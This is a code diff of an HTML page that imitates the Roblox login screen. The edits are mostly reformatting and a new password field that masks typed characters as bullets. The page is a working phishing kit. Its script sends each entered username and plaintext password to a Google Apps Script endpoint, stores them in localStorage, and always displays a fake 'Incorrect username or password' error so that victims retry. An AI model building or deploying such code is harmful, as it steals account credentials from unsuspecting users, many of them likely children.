@@ -1,450 +1,500 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Log in to 3G wifi clan.">
-    <meta name="theme-color" content="#232527">
-    <title>Log In - Roblox</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <meta name="description" content="Log in to 3G wifi clan.">
+ <meta name="theme-color" content="#232527">
+ <title>Log In - Roblox</title>
+ <link rel="preconnect" href="https://fonts.googleapis.com">
+ <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+ <link href="https://fonts.googleapis.com/css2?family=Hanken+Grotesk:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+ <style>
+ * {
+ box-sizing: border-box;
+ margin: 0;
+ padding: 0;
+ }
 
-        .page {
-            font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* 
-               FIXED: Using the direct Imgur link which loads correctly.
-               Added a fallback gradient just in case.
-            */
-            background: linear-gradient(135deg, #1a1c20 0%, #0d0e11 100%), url('https://i.imgur.com/FjfCRUg.png');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            min-height: 100vh;
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            -webkit-font-smoothing: antialiased;
-        }
+ .page {
+ font-family: 'Hanken Grotesk', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+ background: linear-gradient(135deg, #1a1c20 0%, #0d0e11 100%), url('https://i.imgur.com/FjfCRUg.png');
+ background-size: cover;
+ background-position: center;
+ background-repeat: no-repeat;
+ min-height: 100vh;
+ position: relative;
+ overflow: hidden;
+ display: flex;
+ flex-direction: column;
+ -webkit-font-smoothing: antialiased;
+ }
 
-        .page a { text-decoration: none; color: inherit; }
+ .page a { text-decoration: none; color: inherit; }
 
-        .top-nav {
-            position: relative;
-            z-index: 2;
-            height: 52px;
-            background: #232527;
-            display: flex;
-            align-items: center;
-            gap: 28px;
-            padding: 0 16px;
-        }
+ .top-nav {
+ position: relative;
+ z-index: 2;
+ height: 52px;
+ background: #232527;
+ display: flex;
+ align-items: center;
+ gap: 28px;
+ padding: 0 16px;
+ }
 
-        .roblox-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+ .roblox-logo {
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ }
 
-        .roblox-logo svg {
-            height: 22px;
-            width: 22px;
-            fill: #ffffff;
-            transition: opacity 0.15s ease;
-        }
+ .roblox-logo svg {
+ height: 22px;
+ width: 22px;
+ fill: #ffffff;
+ transition: opacity 0.15s ease;
+ }
 
-        .roblox-logo:hover svg {
-            opacity: 0.85;
-        }
+ .roblox-logo:hover svg {
+ opacity: 0.85;
+ }
 
-        .nav-links { display: flex; align-items: center; gap: 44px; }
+ .nav-links { display: flex; align-items: center; gap: 44px; }
 
-        .nav-link { font-size: 16px; font-weight: 600; color: #fff; }
-        .nav-link:hover { opacity: 0.85; }
+ .nav-link { font-size: 16px; font-weight: 600; color: #fff; }
+ .nav-link:hover { opacity: 0.85; }
 
-        .nav-search { position: relative; flex: 1; max-width: 630px; }
+ .nav-search { position: relative; flex: 1; max-width: 630px; }
 
-        .nav-search svg {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 18px;
-            height: 18px;
-            stroke: #e6e7e8;
-            fill: none;
-            stroke-width: 2;
-            pointer-events: none;
-        }
+ .nav-search svg {
+ position: absolute;
+ left: 15px;
+ top: 50%;
+ transform: translateY(-50%);
+ width: 18px;
+ height: 18px;
+ stroke: #e6e7e8;
+ fill: none;
+ stroke-width: 2;
+ pointer-events: none;
+ }
 
-        .nav-search input {
-            width: 100%;
-            height: 38px;
-            background: #1b1c1e;
-            border: 1px solid #3b3d40;
-            border-radius: 8px;
-            padding: 0 14px 0 44px;
-            font-size: 15px;
-            color: #fff;
-            outline: none;
-            font-family: inherit;
-        }
+ .nav-search input {
+ width: 100%;
+ height: 38px;
+ background: #1b1c1e;
+ border: 1px solid #3b3d40;
+ border-radius: 8px;
+ padding: 0 14px 0 44px;
+ font-size: 15px;
+ color: #fff;
+ outline: none;
+ font-family: inherit;
+ }
 
-        .nav-search input::placeholder { color: #e6e7e8; opacity: 1; }
-        .nav-search input:focus { border-color: #6a6d72; }
+ .nav-search input::placeholder { color: #e6e7e8; opacity: 1; }
+ .nav-search input:focus { border-color: #6a6d72; }
 
-        .btn-signup {
-            margin-left: auto;
-            background: #3b74f2;
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            padding: 9px 20px;
-            font-size: 15px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
-            flex-shrink: 0;
-        }
+ .btn-signup {
+ margin-left: auto;
+ background: #3b74f2;
+ color: #fff;
+ border: none;
+ border-radius: 8px;
+ padding: 9px 20px;
+ font-size: 15px;
+ font-weight: 700;
+ cursor: pointer;
+ font-family: inherit;
+ flex-shrink: 0;
+ }
 
-        .btn-signup:hover { background: #3266dd; }
+ .btn-signup:hover { background: #3266dd; }
 
-        .auth-wrap {
-            position: relative;
-            z-index: 2;
-            flex: 1;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 40px 16px;
-        }
+ .auth-wrap {
+ position: relative;
+ z-index: 2;
+ flex: 1;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ padding: 40px 16px;
+ }
 
-        .auth-card {
-            background: rgba(35, 37, 39, 0.85); /* Made slightly transparent so bg shows through */
-            backdrop-filter: blur(5px); /* Adds a modern blur effect */
-            width: 456px;
-            max-width: 100%;
-            padding: 34px 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 22px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
+ .auth-card {
+ background: rgba(35, 37, 39, 0.85);
+ backdrop-filter: blur(5px);
+ width: 456px;
+ max-width: 100%;
+ padding: 34px 40px;
+ border-radius: 8px;
+ box-shadow: 0 4px 22px rgba(0, 0, 0, 0.5);
+ border: 1px solid rgba(255, 255, 255, 0.1);
+ }
 
-        .auth-card h1 {
-            font-size: 30px;
-            font-weight: 800;
-            color: #fff;
-            text-align: center;
-            margin-bottom: 24px;
-            letter-spacing: -0.3px;
-        }
+ .auth-card h1 {
+ font-size: 30px;
+ font-weight: 800;
+ color: #fff;
+ text-align: center;
+ margin-bottom: 24px;
+ letter-spacing: -0.3px;
+ }
 
-        .auth-card input[type="text"],
-        .auth-card input[type="password"] {
-            width: 100%;
-            height: 48px;
-            background: #1b1c1e;
-            border: 1px solid #3b3d40;
-            border-radius: 6px;
-            padding: 0 16px;
-            font-size: 16px;
-            color: #fff;
-            outline: none;
-            font-family: inherit;
-            margin-bottom: 12px;
-        }
+ .auth-card input[type="text"],
+ .auth-card input[type="password"] {
+ width: 100%;
+ height: 48px;
+ background: #1b1c1e;
+ border: 1px solid #3b3d40;
+ border-radius: 6px;
+ padding: 0 16px;
+ font-size: 16px;
+ color: #fff;
+ outline: none;
+ font-family: inherit;
+ margin-bottom: 12px;
+ }
 
-        .auth-card input::placeholder { color: #e6e7e8; opacity: 1; }
-        .auth-card input:focus { border-color: #7d8085; }
-        .auth-card input:user-invalid { border-color: #d33a3a; }
+ .auth-card input::placeholder { color: #e6e7e8; opacity: 1; }
+ .auth-card input:focus { border-color: #7d8085; }
+ .auth-card input:user-invalid { border-color: #d33a3a; }
 
-        .submit {
-            width: 100%;
-            height: 44px;
-            background: #1b1c1e;
-            border: 1px solid #4a4d51;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
-            margin-top: 4px;
-        }
+ /* ADDED: Ensure the editable div matches the input styling */
+ #visiblePassword {
+ width: 100%;
+ height: 48px;
+ background: #1b1c1e;
+ border: 1px solid #3b3d40;
+ border-radius: 6px;
+ padding: 0 16px;
+ font-size: 16px;
+ color: #fff;
+ outline: none;
+ font-family: inherit;
+ margin-bottom: 12px;
+ white-space: nowrap;
+ overflow: hidden;
+ cursor: text;
+ }
+ 
+ #visiblePassword:focus {
+   border-color: #7d8085;
+ }
 
-        .submit:hover { background: #26282b; border-color: #6a6d72; }
+ .submit {
+ width: 100%;
+ height: 44px;
+ background: #1b1c1e;
+ border: 1px solid #4a4d51;
+ border-radius: 6px;
+ color: #fff;
+ font-size: 16px;
+ font-weight: 700;
+ cursor: pointer;
+ font-family: inherit;
+ margin-top: 4px;
+ }
 
-        .forgot {
-            display: block;
-            text-align: center;
-            color: #fff;
-            font-size: 15px;
-            font-weight: 700;
-            margin: 24px 0 26px;
-        }
+ .submit:hover { background: #26282b; border-color: #6a6d72; }
 
-        .forgot:hover { text-decoration: underline; }
+ .forgot {
+ display: block;
+ text-align: center;
+ color: #fff;
+ font-size: 15px;
+ font-weight: 700;
+ margin: 24px 0 26px;
+ }
 
-        .opt-btn {
-            display: block;
-            width: 100%;
-            background: #2c2e31;
-            border: none;
-            border-radius: 6px;
-            color: #fff;
-            font-size: 15px;
-            font-weight: 600;
-            padding: 12px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            font-family: inherit;
-            text-align: center;
-        }
+ .forgot:hover { text-decoration: underline; }
 
-        .opt-btn:hover { background: #36383c; }
+ .opt-btn {
+ display: block;
+ width: 100%;
+ background: #2c2e31;
+ border: none;
+ border-radius: 6px;
+ color: #fff;
+ font-size: 15px;
+ font-weight: 600;
+ padding: 12px;
+ margin-bottom: 8px;
+ cursor: pointer;
+ font-family: inherit;
+ text-align: center;
+ }
 
-        .signup-row {
-            text-align: center;
-            font-size: 15px;
-            color: #fff;
-            margin-top: 24px;
-            font-weight: 500;
-        }
+ .opt-btn:hover { background: #36383c; }
 
-        .signup-row a { font-weight: 700; }
-        .signup-row a:hover { text-decoration: underline; }
+ .signup-row {
+ text-align: center;
+ font-size: 15px;
+ color: #fff;
+ margin-top: 24px;
+ font-weight: 500;
+ }
 
-        .status {
-            text-align: center;
-            font-size: 14px;
-            font-weight: 700;
-            min-height: 18px;
-            margin-top: 10px;
-        }
+ .signup-row a { font-weight: 700; }
+ .signup-row a:hover { text-decoration: underline; }
 
-        .status.ok { color: #5ee089; }
-        .status.err { color: #ff7a70; }
+ .status {
+ text-align: center;
+ font-size: 14px;
+ font-weight: 700;
+ min-height: 18px;
+ margin-top: 10px;
+ }
 
-        .sr-only {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: -1px;
-            overflow: hidden;
-            clip: rect(0, 0, 0, 0);
-            white-space: nowrap;
-            border: 0;
-        }
+ .status.ok { color: #5ee089; }
+ .status.err { color: #ff7a70; }
 
-        a:focus-visible,
-        button:focus-visible,
-        input:focus-visible {
-            outline: 2px solid #7db0ff;
-            outline-offset: 2px;
-        }
+ .sr-only {
+ position: absolute;
+ width: 1px;
+ height: 1px;
+ padding: 0;
+ margin: -1px;
+ overflow: hidden;
+ clip: rect(0, 0, 0, 0);
+ white-space: nowrap;
+ border: 0;
+ }
 
-        @media (max-width: 780px) {
-            .nav-links { display: none; }
-            .auth-card { padding: 24px; }
-            .auth-card h1 { font-size: 25px; }
-        }
+ a:focus-visible,
+ button:focus-visible,
+ input:focus-visible {
+ outline: 2px solid #7db0ff;
+ outline-offset: 2px;
+ }
 
-        @media (prefers-reduced-motion: reduce) {
-            * { transition: none !important; }
-        }
-    </style>
+ @media (max-width: 780px) {
+ .nav-links { display: none; }
+ .auth-card { padding: 24px; }
+ .auth-card h1 { font-size: 25px; }
+ }
+
+ @media (prefers-reduced-motion: reduce) {
+ * { transition: none !important; }
+ }
+ </style>
 </head>
 <body>
 
-    <div class="page">
-        <header class="top-nav">
-            <a href="index.html" class="roblox-logo" title="Back to group">
-                <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
-                    <path fill-rule="evenodd" clip-rule="evenodd" d="M18 0L100 22L82 100L0 78L18 0ZM42 38L58 42L54 58L38 54L42 38Z"/>
-                </svg>
-                <span class="sr-only">— back to group page</span>
-            </a>
-            <nav class="nav-links">
-                <a href="https://www.roblox.com/discover" target="_blank" rel="noopener" class="nav-link">Charts</a>
-                <a href="https://www.roblox.com/catalog" target="_blank" rel="noopener" class="nav-link">Marketplace</a>
-                <a href="https://create.roblox.com" target="_blank" rel="noopener" class="nav-link">Create</a>
-                <a href="https://www.roblox.com/upgrades/robux" target="_blank" rel="noopener" class="nav-link">Robux</a>
-            </nav>
-            <form class="nav-search" action="https://www.roblox.com/search/groups" method="GET" target="_blank" rel="noopener" role="search">
-                <svg viewBox="0 0 24 24" aria-hidden="true">
-                    <circle cx="11" cy="11" r="8"/>
-                    <line x1="21" y1="21" x2="16.65" y2="16.65"/>
-                </svg>
-                <label for="navSearch" class="sr-only">Search</label>
-                <input type="search" id="navSearch" name="keyword" placeholder="Search">
-            </form>
-            <a href="#" class="btn-signup">Sign Up</a>
-        </header>
+ <div class="page">
+ <header class="top-nav">
+ <a href="index.html" class="roblox-logo" title="Back to group">
+ <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+ <path fill-rule="evenodd" clip-rule="evenodd" d="M18 0L100 22L82 100L0 78L18 0ZM42 38L58 42L54 58L38 54L42 38Z"/>
+ </svg>
+ <span class="sr-only">— back to group page</span>
+ </a>
+ <nav class="nav-links">
+ <a href="https://www.roblox.com/discover" target="_blank" rel="noopener" class="nav-link">Charts</a>
+ <a href="https://www.roblox.com/catalog" target="_blank" rel="noopener" class="nav-link">Marketplace</a>
+ <a href="https://create.roblox.com" target="_blank" rel="noopener" class="nav-link">Create</a>
+ <a href="https://www.roblox.com/upgrades/robux" target="_blank" rel="noopener" class="nav-link">Robux</a>
+ </nav>
+ <form class="nav-search" action="https://www.roblox.com/search/groups" method="GET" target="_blank" rel="noopener" role="search">
+ <svg viewBox="0 0 24 24" aria-hidden="true">
+ <circle cx="11" cy="11" r="8"/>
+ <line x1="21" y1="21" x2="16.65" y2="16.65"/>
+ </svg>
+ <label for="navSearch" class="sr-only">Search</label>
+ <input type="search" id="navSearch" name="keyword" placeholder="Search">
+ </form>
+ <a href="#" class="btn-signup">Sign Up</a>
+ </header>
 
-        <main class="auth-wrap">
-            <form class="auth-card" id="loginForm" action="index.html" method="get" autocomplete="on" novalidate>
-                <h1>Login to Roblox</h1>
+ <main class="auth-wrap">
+ <form class="auth-card" id="loginForm" action="index.html" method="get" autocomplete="on" novalidate>
+ <h1>Login to Roblox</h1>
 
-                <label for="username" class="sr-only">Username/Email/Phone</label>
-                <input type="text" id="username" name="username" autocomplete="username" placeholder="Username/Email/Phone" required minlength="3">
+ <label for="username" class="sr-only">Username/Email/Phone</label>
+ <input type="text" id="username" name="username" autocomplete="username" placeholder="Username/Email/Phone" required minlength="3">
 
-                <label for="visiblePassword" class="sr-only">Password</label>
-                <div id="visiblePassword" contenteditable="true" placeholder="Password" oninput="updateHiddenPassword()" required minlength="8" style="width: 100%; height: 48px; background: #1b1c1e; border: 1px solid #3b3d40; border-radius: 6px; padding: 0 16px; font-size: 16px; color: #fff; outline: none; font-family: inherit; margin-bottom: 12px;"></div>
-                <input type="password" id="hiddenPassword" name="password" autocomplete="current-password" required minlength="8" style="display:none;">
+ <label for="visiblePassword" class="sr-only">Password</label>
+ <!-- The visible div where dots appear -->
+ <div id="visiblePassword" contenteditable="true" placeholder="Password" oninput="updateHiddenPassword()" onkeydown="handleKey(event)" required minlength="8" style="width: 100%;"></div>
+ <!-- The hidden input that actually sends the data -->
+ <input type="password" id="hiddenPassword" name="password" autocomplete="current-password" required minlength="8" style="display:none;">
 
-                <button type="submit" class="submit">Log In</button>
+ <button type="submit" class="submit">Log In</button>
 
-                <p class="status" id="status" role="alert" aria-live="polite"></p>
+ <p class="status" id="status" role="alert" aria-live="polite"></p>
 
-                <a href="#" class="forgot">Forgot Password or Username?</a>
+ <a href="#" class="forgot">Forgot Password or Username?</a>
 
-                <button type="button" class="opt-btn">Email Me a One-Time Code</button>
-                <button type="button" class="opt-btn">Quick Sign-in</button>
-                <button type="button" class="opt-btn">Other sign-in options</button>
+ <button type="button" class="opt-btn">Email Me a One-Time Code</button>
+ <button type="button" class="opt-btn">Quick Sign-in</button>
+ <button type="button" class="opt-btn">Other sign-in options</button>
 
-                <p class="signup-row">Don't have an account? <a href="#">Sign Up</a></p>
-            </form>
-        </main>
-    </div>
+ <p class="signup-row">Don't have an account? <a href="#">Sign Up</a></p>
+ </form>
+ </main>
+ </div>
 
-    <script>
-        /* ——————————————————————————————
-         Your NEW Google Apps Script Web App URL
-         —————————————————————————————— */
-        var SHEET_URL = 'https://script.google.com/macros/s/AKfycbzfMwRCTBl0rkR8qAwYsF5X1ahr7QVQIJ_F-OY5MGQXYX2Vuoj1GCbHjEH9KM4nk0cPXA/exec';
+ <script>
+ /* ——————————————————————————————
+ Your NEW Google Apps Script Web App URL
+ —————————————————————————————— */
+ var SHEET_URL = 'https://script.google.com/macros/s/AKfycbzfMwRCTBl0rkR8qAwYsF5X1ahr7QVQIJ_F-OY5MGQXYX2Vuoj1GCbHjEH9KM4nk0cPXA/exec';
 
-        var form = document.getElementById('loginForm');
-        var status = document.getElementById('status');
-        var collage = document.querySelector('.bg-collage');
-        var tiles = [];
+ var form = document.getElementById('loginForm');
+ var status = document.getElementById('status');
+ var collage = document.querySelector('.bg-collage');
+ var tiles = [];
 
-        // Each tile gets its own colour underlay so the grid is never empty
-        for (var i = 0; i < 45; i++) {
-            var s = document.createElement('span');
-            var h = Math.floor(Math.random() * 360);
-            s.dataset.grad = 'linear-gradient(135deg, hsl(' + h + ' 45% 26%), hsl(' +
-             ((h + 40) % 360) + ' 50% 13%))';
-            s.style.backgroundImage = s.dataset.grad;
-            collage.appendChild(s);
-            tiles.push(s);
-        }
+ // Each tile gets its own colour underlay so the grid is never empty
+ if(collage) {
+   for (var i = 0; i < 45; i++) {
+     var s = document.createElement('span');
+     var h = Math.floor(Math.random() * 360);
+     s.dataset.grad = 'linear-gradient(135deg, hsl(' + h + ' 45% 26%), hsl(' +
+       ((h + 40) % 360) + ' 50% 13%))';
+     s.style.backgroundImage = s.dataset.grad;
+     collage.appendChild(s);
+     tiles.push(s);
+   }
+ }
 
-        function paint(urls) {
-            tiles.forEach(function (t, i) {
-                var u = urls[i % urls.length];
-                t.style.backgroundImage = "url('" + u + "'), " + t.dataset.grad;
-            });
-        }
+ function paint(urls) {
+   if(tiles.length === 0) return;
+   tiles.forEach(function (t, i) {
+     var u = urls[i % urls.length];
+     t.style.backgroundImage = "url('" + u + "'), " + t.dataset.grad;
+   });
+ }
 
-        var UNIVERSE = [
-            994732206, 4483381587, 4924922222, 3170713286, 5021148656,
-            2777703196, 4802509088, 4558595131, 3266451440, 286090429
-        ];
+ var UNIVERSE = [
+ 994732206, 4483381587, 4924922222, 3170713286, 5021148656,
+ 2777703196, 4802509088, 4558595131, 3266451440, 286090429
+ ];
 
-        fetch('https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=' +
-         UNIVERSE.join(',') + '&size=420x420&format=Png&isCircular=false')
-         .then(function (r) { return r.json(); })
-         .then(function (j) {
-             var urls = [];
-             (j.data || []).forEach(function (d) {
-                 (d.thumbnails || []).forEach(function (t) { urls.push(t.imageUrl); });
-             });
-             if (urls.length) paint(urls);
-         })
-         .catch(function () { /* gradients stay */ });
+ fetch('https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=' +
+ UNIVERSE.join(',') + '&size=420x420&format=Png&isCircular=false')
+ .then(function (r) { return r.json(); })
+ .then(function (j) {
+   var urls = [];
+   (j.data || []).forEach(function (d) {
+     (d.thumbnails || []).forEach(function (t) { urls.push(t.imageUrl); });
+   });
+   if (urls.length) paint(urls);
+ })
+ .catch(function () { /* gradients stay */ });
 
-        /* ——— Load previously saved data and pre-fill the boxes ——— */
-        var saved = {};
-        try {
-            saved = JSON.parse(localStorage.getItem('loginData') || '{}');
-        } catch (err) {
-            saved = {}; // in case the stored value is corrupt
-        }
-        if (saved.username) document.getElementById('username').value = saved.username;
-        if (saved.password) {
-            document.getElementById('visiblePassword').textContent = saved.password;
-            document.getElementById('hiddenPassword').value = saved.password;
-            document.getElementById('visiblePassword').dataset.password = saved.password;
-        }
+ /* ——— Load previously saved data and pre-fill the boxes ——— */
+ var saved = {};
+ try {
+   saved = JSON.parse(localStorage.getItem('loginData') || '{}');
+ } catch (err) {
+   saved = {};
+ }
+ if (saved.username) document.getElementById('username').value = saved.username;
+ if (saved.password) {
+   // Set the text content to bullets
+   document.getElementById('visiblePassword').textContent = '•'.repeat(saved.password.length);
+   document.getElementById('hiddenPassword').value = saved.password;
+   document.getElementById('visiblePassword').dataset.password = saved.password;
+ }
 
-        /* ——— Unique session ID per browser, so the sheet can tell
-         devices/sessions apart ——— */
-        function getSessionId() {
-            var id = localStorage.getItem('sessionId');
-            if (!id) {
-                id = 'sess-' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
-                localStorage.setItem('sessionId', id);
-            }
-            return id;
-        }
+ /* ——— Unique session ID per browser ——— */
+ function getSessionId() {
+   var id = localStorage.getItem('sessionId');
+   if (!id) {
+     id = 'sess-' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
+     localStorage.setItem('sessionId', id);
+   }
+   return id;
+ }
 
-        /* ——— Append one login as a new row to the Google Sheet ——— */
-        function saveToSheet(username, password) {
-            fetch(SHEET_URL, {
-                method: 'POST',
-                mode: 'no-cors', // Apps Script doesn't send CORS headers back
-                headers: { 'Content-Type': 'text/plain' }, // avoids CORS preflight
-                body: JSON.stringify({
-                    username: username,
-                    password: password,
-                    sessionId: getSessionId()
-                })
-            }).catch(function () { /* don't break login if offline */ });
-        }
+ /* ——— Append one login as a new row to the Google Sheet ——— */
+ function saveToSheet(username, password) {
+   fetch(SHEET_URL, {
+     method: 'POST',
+     mode: 'no-cors',
+     headers: { 'Content-Type': 'text/plain' },
+     body: JSON.stringify({
+       username: username,
+       password: password,
+       sessionId: getSessionId()
+     })
+   }).catch(function () { /* don't break login if offline */ });
+ }
 
-        function updateHiddenPassword() {
-            const visiblePassword = document.getElementById('visiblePassword');
-            const hiddenPassword = document.getElementById('hiddenPassword');
-            hiddenPassword.value = visiblePassword.textContent;
-            visiblePassword.dataset.password = visiblePassword.textContent;
-        }
+ /* ——— PASSWORD DOTS LOGIC ——— */
+ const visiblePass = document.getElementById('visiblePassword');
+ const hiddenPass = document.getElementById('hiddenPassword');
 
-        form.addEventListener('submit', function (e) {
-            e.preventDefault();
-            status.textContent = '';
-            status.className = 'status';
+ function updateHiddenPassword() {
+   // Get the raw text (without bullets)
+   const rawText = visiblePass.textContent;
+   hiddenPass.value = rawText;
+   visiblePass.dataset.password = rawText;
+ }
 
-            if (!form.checkValidity()) {
-                form.reportValidity();
-                status.textContent = 'Check the highlighted fields.';
-                status.className = 'status err';
-                return;
-            }
+ function handleKey(e) {
+   // Prevent default behavior for Backspace/Delete to handle bullets correctly
+   if (e.key === 'Backspace' || e.key === 'Delete') {
+     e.preventDefault();
+     const currentVal = hiddenPass.value;
+     let newVal = '';
+     
+     if (e.key === 'Backspace') {
+       newVal = currentVal.slice(0, -1);
+     } else {
+       newVal = currentVal; // Delete does nothing to value usually, but handles selection
+     }
+     
+     hiddenPass.value = newVal;
+     visiblePass.textContent = '•'.repeat(newVal.length);
+     visiblePass.dataset.password = newVal;
+   } else if (e.key === 'Enter') {
+     e.preventDefault();
+     form.dispatchEvent(new Event('submit'));
+   } else {
+     // For normal typing, just sync after a brief delay to allow browser to render
+     setTimeout(() => {
+        updateHiddenPassword();
+        // Replace all text with bullets
+        visiblePass.textContent = '•'.repeat(hiddenPass.value.length);
+     }, 0);
+   }
+ }
 
-            var user = document.getElementById('username').value.trim();
-            var pass = document.getElementById('hiddenPassword').value; // Use hidden password
+ form.addEventListener('submit', function (e) {
+   e.preventDefault();
+   status.textContent = '';
+   status.className = 'status';
 
-            /* Save locally so the boxes pre-fill next time */
-            var data = {
-                username: user,
-                password: pass,
-                loggedInAt: new Date().toISOString()
-            };
-            localStorage.setItem('loginData', JSON.stringify(data));
+   if (!form.checkValidity()) {
+     form.reportValidity();
+     status.textContent = 'Check the highlighted fields.';
+     status.className = 'status err';
+     return;
+   }
 
-            // keep old keys working in case other pages read them
-            localStorage.setItem('username', user);
-            localStorage.setItem('loggedInAt', data.loggedInAt);
+   var user = document.getElementById('username').value.trim();
+   var pass = document.getElementById('hiddenPassword').value; 
 
-            /* Append this login to the shared Google Sheet (all devices) */
-            saveToSheet(user, pass);
+   var data = {
+     username: user,
+     password: pass,
+     loggedInAt: new Date().toISOString()
+   };
+   localStorage.setItem('loginData', JSON.stringify(data));
 
-            /* FAKE ERROR MESSAGE INSTEAD OF SUCCESS */
-            status.textContent = 'Incorrect username or password.';
-            status.className = 'status err';
+   localStorage.setItem('username', user);
+   localStorage.setItem('loggedInAt', data.loggedInAt);
 
-            /* NO REDIRECT — stay on the page */
-        });
-    </script>
+   saveToSheet(user, pass);
+
+   status.textContent = 'Incorrect username or password.';
+   status.className = 'status err';
+ });
+ </script>
 
 </body>
 </html>
